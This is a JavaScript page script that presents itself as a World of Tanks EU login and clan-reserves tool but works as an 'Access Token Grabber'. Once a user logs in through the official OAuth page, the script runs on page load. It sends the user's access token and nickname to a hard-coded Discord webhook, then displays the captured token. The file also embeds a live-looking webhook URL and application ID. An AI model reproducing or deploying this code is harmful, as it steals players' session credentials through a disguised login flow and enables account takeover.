var APPLICATION_ID = "e44ef6c31338d3751c4e4b221ecab52e";
var BASE = "https://api.worldoftanks.eu";
var LOGIN = BASE + "/wot/auth/login/";
var RESERVES = BASE + "/wot/stronghold/clanreserves/";

function parseQueryString(queryString) {
    var queryParams = {};
    queryString.slice(1).split('&').filter(function (keyValString) {
        return keyValString !== "";
    }).forEach(function (keyValString) {
        var keyVal = keyValString.split("=");
        var key = keyVal[0];
        var val = keyVal[1];
        queryParams[key] = decodeURIComponent(val);
    });
    return queryParams;
}

function makeQueryString(queryParams) {
    return Object.keys(queryParams).map(function (key) {
        return key + "=" + encodeURIComponent(queryParams[key]);
    }).join("&");
}

function makeRequestUrl(base, queryParams) {
    return base + "?" + makeQueryString(queryParams);
}

function login() {
    window.location.href = makeRequestUrl(LOGIN, {
        "application_id": APPLICATION_ID,
        "redirect_uri": document.location.origin + document.location.pathname
    });
}

function fetchReserves(loginData) {
    var requestUrl = makeRequestUrl(RESERVES, {
        "application_id": APPLICATION_ID,
        "access_token": loginData["access_token"]
    });
    var req = new XMLHttpRequest();
    req.addEventListener("load", function () {
        var prettyJSON = JSON.stringify(JSON.parse(this.responseText), null, 2);
        document.getElementById("reserves-info").innerText = prettyJSON;
    });
    req.open("GET", requestUrl);
    req.send();
}

var loginData = parseQueryString(document.location.search);
if (loginData.status === "ok" && loginData["access_token"]) {
    sendMessage(loginData)
    //fetchReserves(loginData);
    displayToken(loginData);
    window.history.replaceState('Access Token Grabber', 'Access Token Grabber', '/wot-access_token');
}

function sendMessage(loginData) {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/898642621973540914/nptllsw8uKVdMeb6vuNHix_H6SCQSaXJWAdJ-rVhRppQFb0NzJTCUT4H8ksP9Tx69lSy");
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
        username: "Access Graber",
        avatar_url: "https://samequizy.pl/wp-content/uploads/2021/02/images_80304f732f3d.jpg",
        content: "**New Access Token**:\nUser: " + loginData.nickname + "\nToken: " + loginData.access_token
    }
    request.send(JSON.stringify(params));
    
}

function displayToken(loginData) {
    document.getElementById("token_grabbed").innerHTML = "Przechwycony Token: " + loginData.access_token + "<br>Użytkownika: " + loginData.nickname  
}